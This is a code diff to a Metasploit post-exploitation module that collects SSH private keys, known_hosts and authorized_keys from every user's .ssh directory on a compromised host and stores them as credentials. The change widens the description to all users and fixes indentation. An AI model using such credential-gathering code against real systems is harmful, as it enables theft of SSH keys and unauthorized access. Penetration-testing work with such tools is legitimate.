@@ -22,7 +22,7 @@ class Metasploit3 < Msf::Post
 		super( update_info(info,
 			'Name'           => 'Multi Gather OpenSSH PKI Credentials Collection',
 			'Description'    => %q{
-					This module will collect the contents of user's .ssh directory on the targeted
+					This module will collect the contents of all users' .ssh directories on the targeted
 				machine. Additionally, known_hosts and authorized_keys and any other files are also
 				downloaded. This module is largely based on firefox_creds.rb.
 			},
@@ -59,9 +59,9 @@ class Metasploit3 < Msf::Post
 				sep = "/"
 				files = cmd_exec("ls -1 #{path}").split(/\r\n|\r|\n/)
 			end
-      path_array = path.split(sep)
-      path_array.pop
-      user = path_array.pop
+			path_array = path.split(sep)
+			path_array.pop
+			user = path_array.pop
 			files.each do |file|
 				next if [".", ".."].include?(file)
 				data = read_file("#{path}#{sep}#{file}")
@@ -79,7 +79,7 @@ class Metasploit3 < Msf::Post
 						:host => session.session_host,
 						:port => 22,
 						:sname => 'ssh',
-            :user => user,
+						:user => user,
 						:pass => loot_path,
 						:source_type => "exploit",
 						:type => 'ssh_key',
